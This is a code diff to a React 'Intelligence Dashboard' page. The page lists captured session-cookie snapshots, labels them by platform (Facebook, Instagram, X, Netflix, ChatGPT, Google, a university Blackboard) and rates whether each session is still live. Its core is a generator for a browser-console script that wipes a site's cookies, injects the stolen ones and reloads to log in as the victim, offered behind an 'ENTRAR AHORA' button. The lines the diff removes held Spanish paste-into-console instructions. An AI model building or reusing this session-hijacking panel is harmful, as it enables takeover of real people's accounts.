@@ -6,7 +6,7 @@ import GlassCard from "@/components/GlassCard";
 import { 
   Search, Clock, Globe, ExternalLink, 
   Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
-  Twitter, MessageSquare, Play, AlertCircle
+  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot
 } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 
@@ -18,6 +18,18 @@ interface AccountInfo {
   health: "active" | "expiring" | "expired";
 }
 
+// Relative time formatter
+const formatRelativeTime = (date: string) => {
+  const now = new Date();
+  const captured = new Date(date);
+  const diffInSeconds = Math.floor((now.getTime() - captured.getTime()) / 1000);
+
+  if (diffInSeconds < 60) return "just now";
+  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)}m ago`;
+  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)}h ago`;
+  return captured.toLocaleDateString();
+};
+
 export default function SessionsPage() {
   const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
   const [loading, setLoading] = useState(true);
@@ -28,63 +40,71 @@ export default function SessionsPage() {
   const [viewMode, setViewMode] = useState<"grid" | "list">("grid");
   const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
   const [copied, setCopied] = useState(false);
+  const [currentTime, setCurrentTime] = useState(new Date());
 
   useEffect(() => {
     fetchSessions();
+    const timer = setInterval(() => setCurrentTime(new Date()), 30000); // UI Refresh every 30s
+    return () => clearInterval(timer);
   }, []);
 
   const getHealthStatus = (cookies: Cookie[]): "active" | "expiring" | "expired" => {
     if (!cookies || cookies.length === 0) return "expired";
-    
     const now = Date.now() / 1000;
     const oneWeek = 7 * 24 * 60 * 60;
     
-    // Check main session cookies for each platform
-    const sessionCookie = cookies.find(c => 
-      ["c_user", "ds_user_id", "auth_token", "__Secure-next-auth.session-token", "SID", "NetflixId"].includes(c.name)
-    );
+    // Look for high-importance session cookies
+    const indicators = ["c_user", "ds_user_id", "auth_token", "__Secure-next-auth.session-token", "SID", "NetflixId", "li_at", "ajs_user_id"];
+    const sessionCookie = cookies.find(c => indicators.includes(c.name));
 
-    if (!sessionCookie || !sessionCookie.expiration_date) return "active"; // Session cookies often lack expiration
-
+    if (!sessionCookie || !sessionCookie.expiration_date) return "active";
     if (sessionCookie.expiration_date < now) return "expired";
     if (sessionCookie.expiration_date < now + oneWeek) return "expiring";
-    
     return "active";
   };
 
   const identifyAccount = (sessionCookies: Cookie[], fallbackId: string): AccountInfo => {
     const health = getHealthStatus(sessionCookies);
+    const domainStr = sessionCookies.map(c => c.domain.toLowerCase()).join(" ");
+
+    // Detection Logic based on Domain
+    if (domainStr.includes("openai.com") || domainStr.includes("chatgpt.com")) 
+      return { platform: "ChatGPT", identifier: "AI Assistant", icon: MessageSquare, color: "text-emerald-400", health };
     
-    // ChatGPT
-    const chatGPT = sessionCookies.find(c => c.domain.includes("openai.com") || c.domain.includes("chatgpt.com"));
-    if (chatGPT) {
-      const token = sessionCookies.find(c => c.name.includes("session-token"));
-      return { platform: "ChatGPT", identifier: token ? "AI Assistant" : "ChatGPT User", icon: MessageSquare, color: "text-emerald-400", health };
+    if (domainStr.includes("kick.com"))
+      return { platform: "Kick", identifier: "Streamer", icon: Gamepad2, color: "text-green-500", health };
+
+    if (domainStr.includes("openart.ai") || domainStr.includes("nijijourney.com") || domainStr.includes("midjourney.com"))
+      return { platform: "AI Arts", identifier: "Creator", icon: Palette, color: "text-purple-400", health };
+
+    if (domainStr.includes("x.com") || domainStr.includes("twitter.com"))
+      return { platform: "X / Twitter", identifier: "Social", icon: Twitter, color: "text-blue-400", health };
+
+    if (domainStr.includes("netflix.com"))
+      return { platform: "Netflix", identifier: "Viewer", icon: Play, color: "text-red-600", health };
+
+    if (domainStr.includes("facebook.com")) {
+      const fbId = sessionCookies.find(c => c.name === "c_user")?.value;
+      return { platform: "Facebook", identifier: fbId || "Facebook User", icon: Facebook, color: "text-blue-500", health };
     }
 
-    // X / Twitter
-    const xCookie = sessionCookies.find(c => (c.domain.includes("x.com") || c.domain.includes("twitter.com")) && c.name === "auth_token");
-    if (xCookie) return { platform: "X / Twitter", identifier: "Twitter Account", icon: Twitter, color: "text-blue-400", health };
+    if (domainStr.includes("instagram.com")) {
+      const igId = sessionCookies.find(c => c.name === "ds_user_id")?.value;
+      return { platform: "Instagram", identifier: igId || "Instagram User", icon: Instagram, color: "text-pink-500", health };
+    }
 
-    // Netflix
-    const netflix = sessionCookies.find(c => c.domain.includes("netflix.com") && c.name.includes("NetflixId"));
-    if (netflix) return { platform: "Netflix", identifier: "Streamer", icon: Play, color: "text-red-600", health };
+    if (domainStr.includes("yahoo.com"))
+      return { platform: "Yahoo", identifier: "Mail User", icon: Mail, color: "text-purple-600", health };
 
-    // Facebook Logic
-    const fbCookie = sessionCookies.find(c => c.domain.includes("facebook.com") && c.name === "c_user");
-    if (fbCookie) return { platform: "Facebook", identifier: fbCookie.value, icon: Facebook, color: "text-blue-500", health };
+    if (domainStr.includes("up.edu.pe") || domainStr.includes("blackboard.com"))
+      return { platform: "Blackboard", identifier: "Student", icon: GraduationCap, color: "text-blue-400", health };
 
-    // Instagram Logic
-    const igCookie = sessionCookies.find(c => c.domain.includes("instagram.com") && c.name === "ds_user_id");
-    if (igCookie) return { platform: "Instagram", identifier: igCookie.value, icon: Instagram, color: "text-pink-500", health };
+    if (domainStr.includes("google.com"))
+      return { platform: "Google", identifier: "Google User", icon: Globe, color: "text-red-400", health };
 
-    // Blackboard / UP Logic
-    const bbCookie = sessionCookies.find(c => c.domain.includes("up.edu.pe") || c.domain.includes("blackboard.com"));
-    if (bbCookie) return { platform: "Blackboard", identifier: "UP Student", icon: GraduationCap, color: "text-blue-400", health };
-
-    // Google Logic
-    const gCookie = sessionCookies.find(c => c.domain.includes("google.com") && (c.name === "SID" || c.name === "HSID"));
-    if (gCookie) return { platform: "Google", identifier: "Google Account", icon: Globe, color: "text-red-400", health };
+    // Default match by cookie names if domain focus fails
+    const botDetect = sessionCookies.find(c => c.name.toLowerCase().includes("token") || c.name.toLowerCase().includes("session"));
+    if (botDetect) return { platform: "Generic App", identifier: "Active User", icon: Bot, color: "text-amber-400", health };
 
     return { platform: "Unknown", identifier: fallbackId || "Generic Session", icon: Shield, color: "text-gray-400", health: "active" };
   };
@@ -121,7 +141,6 @@ export default function SessionsPage() {
       .from("cookies")
       .select("*")
       .eq("snapshot_id", snapshotId);
-    
     if (data) setCookies(data);
     setLoadingCookies(false);
   };
@@ -134,13 +153,11 @@ export default function SessionsPage() {
 
   const generateConsoleScript = () => {
     if (cookies.length === 0) return "";
-    
-    const script = `(function() {
+    return `(function() {
   const cookies = ${JSON.stringify(cookies)};
   console.clear();
   console.log('%c [SessionSafe] Limpiando Sesión Previa... ', 'background: #f59e0b; color: #fff; font-weight: bold; border-radius: 4px; padding: 5px;');
   
-  // Clean existing cookies to avoid conflicts
   document.cookie.split(";").forEach(function(c) { 
     document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
     document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/;domain=" + location.hostname.replace(/^www\./, "."));
@@ -150,31 +167,25 @@ export default function SessionsPage() {
   
   cookies.forEach(c => {
     try {
-      const cookieStr = c.name + '=' + encodeURIComponent(c.value) + 
+      document.cookie = c.name + '=' + encodeURIComponent(c.value) + 
                       '; domain=' + c.domain + 
                       '; path=' + (c.path || '/') + 
                       '; SameSite=Lax; Secure';
-      document.cookie = cookieStr;
     } catch (e) {}
   });
   
-  console.log('%c ¡ÉXITO! Recargando para iniciar sesión... ', 'color: #10b981; font-weight: bold;');
+  console.log('%c ¡ÉXITO! Recargando... ', 'color: #10b981; font-weight: bold;');
   setTimeout(() => location.reload(), 1500);
 })();`;
-
-    return script;
   };
 
   const copyToClipboard = () => {
     const script = generateConsoleScript();
     if (!script) return;
-
     navigator.clipboard.writeText(script).then(() => {
       setCopied(true);
       setTimeout(() => setCopied(false), 5000);
-    }).catch(err => {
-      prompt("Copia este código:", script);
-    });
+    }).catch(() => prompt("Copia este código:", script));
   };
 
   const filteredSessions = sessions.filter(s => 
@@ -188,7 +199,7 @@ export default function SessionsPage() {
       <header className="flex flex-col md:flex-row md:items-center justify-between gap-4">
         <div>
           <h2 className="text-3xl font-bold tracking-tight">Intelligence Dashboard</h2>
-          <p className="text-gray-400">Monitoring {sessions.length} sessions across multiple platforms.</p>
+          <p className="text-gray-400">Monitoring {sessions.length} sessions across all detected domains.</p>
         </div>
         
         <div className="flex items-center gap-3">
@@ -196,20 +207,15 @@ export default function SessionsPage() {
             <Search className="text-gray-500 mr-2" size={18} />
             <input 
               type="text" 
-              placeholder="Search platform or ID..." 
+              placeholder="Search domain or ID..." 
               className="bg-transparent border-none outline-none text-sm w-full py-2"
               value={searchTerm}
               onChange={(e) => setSearchTerm(e.target.value)}
             />
           </div>
-          <div className="glass p-1 rounded-xl flex gap-1">
-            <button onClick={() => setViewMode("grid")} className={`p-2 rounded-lg transition-colors ${viewMode === "grid" ? "bg-blue-600 text-white" : "text-gray-500 hover:text-white"}`}>
-              <LayoutGrid size={18} />
-            </button>
-            <button onClick={() => setViewMode("list")} className={`p-2 rounded-lg transition-colors ${viewMode === "list" ? "bg-blue-600 text-white" : "text-gray-500 hover:text-white"}`}>
-              <List size={18} />
-            </button>
-          </div>
+          <button onClick={fetchSessions} className="glass p-2.5 rounded-xl hover:bg-white/5 transition-colors">
+            <Clock size={20} className={loading ? "animate-spin text-blue-400" : "text-gray-400"} />
+          </button>
         </div>
       </header>
 
@@ -218,100 +224,50 @@ export default function SessionsPage() {
           {[1, 2, 3, 4, 5, 6, 7, 8].map(i => <div key={i} className="h-48 glass rounded-3xl animate-pulse" />)}
         </div>
       ) : (
-        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
-          <div className="lg:col-span-12">
-            {viewMode === "grid" ? (
-              <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
-                {filteredSessions.map((session, idx) => {
-                  const info = accountMap[session.id] || { platform: "Unknown", identifier: session.user_id, icon: Shield, color: "text-gray-500", health: "active" };
-                  return (
-                    <motion.div
-                      key={session.id}
-                      layoutId={session.id}
-                      initial={{ opacity: 0, scale: 0.9 }}
-                      animate={{ opacity: 1, scale: 1 }}
-                      transition={{ delay: idx * 0.05 }}
-                      onClick={() => handleSessionClick(session)}
-                      className={`glass p-6 rounded-3xl cursor-pointer border-2 transition-all hover:scale-[1.03] active:scale-[0.98] ${selectedSession?.id === session.id ? "border-blue-500 shadow-xl shadow-blue-500/20 bg-blue-500/5" : "border-transparent hover:border-white/10"}`}
-                    >
-                      <div className="flex items-start justify-between mb-4">
-                        <div className={`p-3 rounded-2xl bg-white/5 ${info.color}`}>
-                          <info.icon size={28} />
-                        </div>
-                        <div className="flex flex-col items-end gap-1">
-                          <div className="glass-pill px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider text-gray-400">
-                            {info.platform}
-                          </div>
-                          <div className={`text-[9px] font-bold uppercase px-2 py-0.5 rounded-full flex items-center gap-1 ${
-                            info.health === "active" ? "bg-emerald-500/10 text-emerald-400" :
-                            info.health === "expiring" ? "bg-amber-500/10 text-amber-400" :
-                            "bg-red-500/10 text-red-400"
-                          }`}>
-                            <div className={`w-1 h-1 rounded-full ${
-                              info.health === "active" ? "bg-emerald-500" :
-                              info.health === "expiring" ? "bg-amber-500" :
-                              "bg-red-500"
-                            }`} />
-                            {info.health}
-                          </div>
-                        </div>
-                      </div>
-                      <div>
-                        <h4 className="font-bold text-lg truncate mb-1">{info.identifier}</h4>
-                        <div className="flex items-center gap-2 text-xs text-gray-500">
-                          <Clock size={12} />
-                          {new Date(session.captured_at).toLocaleDateString()}
-                        </div>
-                      </div>
-                    </motion.div>
-                  );
-                })}
-              </div>
-            ) : (
-              <div className="glass overflow-hidden rounded-3xl border border-white/10">
-                <table className="w-full text-left">
-                  <thead>
-                    <tr className="bg-white/5 text-gray-400 text-xs font-bold uppercase tracking-wider">
-                      <th className="px-6 py-4">Account Identifier</th>
-                      <th className="px-6 py-4">Platform</th>
-                      <th className="px-6 py-4">Health</th>
-                      <th className="px-6 py-4">Captured At</th>
-                      <th className="px-6 py-4 text-right">Action</th>
-                    </tr>
-                  </thead>
-                  <tbody className="divide-y divide-white/5">
-                    {filteredSessions.map((session) => {
-                      const info = accountMap[session.id] || { platform: "Unknown", identifier: session.user_id, icon: Shield, color: "text-gray-500", health: "active" };
-                      return (
-                        <tr key={session.id} onClick={() => handleSessionClick(session)} className={`hover:bg-white/5 cursor-pointer transition-colors ${selectedSession?.id === session.id ? "bg-blue-500/10" : ""}`}>
-                          <td className="px-6 py-4 font-medium">{info.identifier}</td>
-                          <td className="px-6 py-4">
-                            <div className="flex items-center gap-2">
-                              <info.icon size={14} className={info.color} />
-                              <span className="text-xs">{info.platform}</span>
-                            </div>
-                          </td>
-                          <td className="px-6 py-4">
-                             <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${
-                                info.health === "active" ? "text-emerald-400" :
-                                info.health === "expiring" ? "text-amber-400" :
-                                "text-red-400"
-                              }`}>
-                                {info.health.toUpperCase()}
-                             </span>
-                          </td>
-                          <td className="px-6 py-4 text-xs text-gray-500">{new Date(session.captured_at).toLocaleString()}</td>
-                          <td className="px-6 py-4 text-right">
-                            <ExternalLink size={16} className="text-gray-600 ml-auto" />
-                          </td>
-                        </tr>
-                      );
-                    })}
-                  </tbody>
-                </table>
-              </div>
-            )}
-          </div>
+        <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
+          {filteredSessions.map((session, idx) => {
+            const info = accountMap[session.id] || { platform: "Unknown", identifier: session.user_id, icon: Shield, color: "text-gray-500", health: "active" };
+            return (
+              <motion.div
+                key={session.id}
+                initial={{ opacity: 0, y: 20 }}
+                animate={{ opacity: 1, y: 0 }}
+                transition={{ delay: idx * 0.05 }}
+                onClick={() => handleSessionClick(session)}
+                className={`glass p-6 rounded-3xl cursor-pointer border-2 transition-all hover:scale-[1.03] active:scale-[0.98] ${selectedSession?.id === session.id ? "border-blue-500 shadow-xl shadow-blue-500/20 bg-blue-500/5" : "border-transparent hover:border-white/10"}`}
+              >
+                <div className="flex items-start justify-between mb-4">
+                  <div className={`p-3 rounded-2xl bg-white/5 ${info.color}`}>
+                    <info.icon size={28} />
+                  </div>
+                  <div className="flex flex-col items-end gap-1">
+                    <div className="glass-pill px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider text-gray-400">
+                      {info.platform}
+                    </div>
+                    <div className={`text-[9px] font-bold uppercase px-2 py-0.5 rounded-full flex items-center gap-1 ${
+                      info.health === "active" ? "bg-emerald-500/10 text-emerald-400" :
+                      info.health === "expiring" ? "bg-amber-500/10 text-amber-400" :
+                      "bg-red-500/10 text-red-400"
+                    }`}>
+                      <div className={`w-1 h-1 rounded-full ${
+                        info.health === "active" ? "bg-emerald-500" :
+                        info.health === "expiring" ? "bg-amber-500" :
+                        "bg-red-500"
+                      }`} />
+                      {info.health}
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  <h4 className="font-bold text-lg truncate mb-1">{info.identifier}</h4>
+                  <div className="flex items-center gap-2 text-xs text-gray-500">
+                    <Clock size={12} />
+                    {formatRelativeTime(session.captured_at)}
+                  </div>
+                </div>
+              </motion.div>
+            );
+          })}
         </div>
       )}
 
@@ -333,13 +289,13 @@ export default function SessionsPage() {
                     <div>
                       <div className="flex items-center gap-3">
                         <h3 className="text-2xl font-bold">{accountMap[selectedSession.id]?.identifier}</h3>
-                        {accountMap[selectedSession.id]?.health === "expired" && (
-                          <div className="flex items-center gap-1 text-red-400 text-xs font-bold bg-red-500/10 px-2 py-0.5 rounded-lg border border-red-500/20">
-                            <AlertCircle size={12} /> EXPIRED
+                        {accountMap[selectedSession.id]?.health === "active" && (
+                          <div className="flex items-center gap-1 text-emerald-400 text-[10px] font-bold bg-emerald-500/10 px-2 py-0.5 rounded-lg border border-emerald-500/20">
+                            VERIFIED ACTIVE
                           </div>
                         )}
                       </div>
-                      <p className="text-gray-400">Purge & Inject automated system for {accountMap[selectedSession.id]?.platform.toLowerCase()}</p>
+                      <p className="text-gray-400">Advanced injection ready for {accountMap[selectedSession.id]?.platform.toLowerCase()}</p>
                     </div>
                   </div>
                   
@@ -350,49 +306,11 @@ export default function SessionsPage() {
                     >
                       Cerrar
                     </button>
-                    <button 
-                      onClick={copyToClipboard}
-                      className={"flex items-center gap-3 px-10 py-4 rounded-2xl transition-all font-black text-xl shadow-2xl active:scale-95 group " + (copied ? "bg-emerald-600 shadow-emerald-600/30" : "bg-blue-600 hover:bg-blue-500 shadow-blue-600/30")}
-                    >
-                      {copied ? (
-                        <>
-                          <Check size={24} className="animate-bounce" />
-                          ¡COPIADO!
-                        </>
-                      ) : (
-                        <>
-                          <Copy size={24} className="group-hover:rotate-6 transition-transform" />
-                          ENTRAR AHORA
-                        </>
-                      )}
+                    <button onClick={copyToClipboard} className={"flex items-center gap-3 px-10 py-4 rounded-2xl transition-all font-black text-xl shadow-2xl active:scale-95 group " + (copied ? "bg-emerald-600 shadow-emerald-600/30" : "bg-blue-600 hover:bg-blue-500 shadow-blue-600/30")}>
+                      {copied ? <><Check size={24} /> ¡COPIADO!</> : <><Copy size={24} /> ENTRAR AHORA</>}
                     </button>
                   </div>
                 </div>
-                
-                {copied && (
-                   <motion.div 
-                     initial={{ opacity: 0, height: 0 }}
-                     animate={{ opacity: 1, height: "auto" }}
-                     className="mt-6 p-5 rounded-2xl bg-blue-500/5 border border-blue-500/20 space-y-3"
-                   >
-                     <p className="text-sm font-bold text-blue-400 flex items-center gap-2">
-                       <Shield size={16} /> GUÍA DE INYECCIÓN SEGURA:
-                     </p>
-                     <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                       <div className="space-y-2">
-                         <p className="text-[11px] text-gray-300">1. Entra a <strong>{accountMap[selectedSession.id]?.platform.toLowerCase()}.com</strong></p>
-                         <p className="text-[11px] text-gray-300">2. Abre la consola (<kbd className="glass px-1 text-white">F12</kbd> o <kbd className="glass px-1 text-white">Ctrl+Shift+J</kbd>)</p>
-                       </div>
-                       <div className="space-y-2">
-                         <p className="text-[11px] text-gray-300">3. Si es necesario, escribe <code className="text-amber-400">allow pasting</code></p>
-                         <p className="text-[11px] text-gray-300">4. Pega el código (<kbd className="glass px-1 text-white">Ctrl+V</kbd>) y dale a <strong>ENTER</strong></p>
-                       </div>
-                     </div>
-                     <p className="text-[10px] text-gray-500 italic mt-2 text-center border-t border-white/5 pt-2">
-                       El script limpiará automáticamente cualquier rastro de sesiones anteriores antes de entrar.
-                     </p>
-                   </motion.div>
-                )}
               </GlassCard>
             </div>
           </motion.div>
